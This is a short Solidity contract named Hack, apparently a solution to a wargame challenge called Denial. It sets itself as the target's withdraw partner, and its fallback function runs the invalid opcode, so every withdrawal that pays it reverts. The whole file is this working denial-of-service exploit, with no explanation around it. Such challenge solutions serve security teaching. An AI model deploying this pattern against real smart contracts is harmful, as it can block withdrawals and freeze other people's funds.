// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract Hack {
    constructor(Denial _target) {
        _target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            invalid()
        }
    }
}
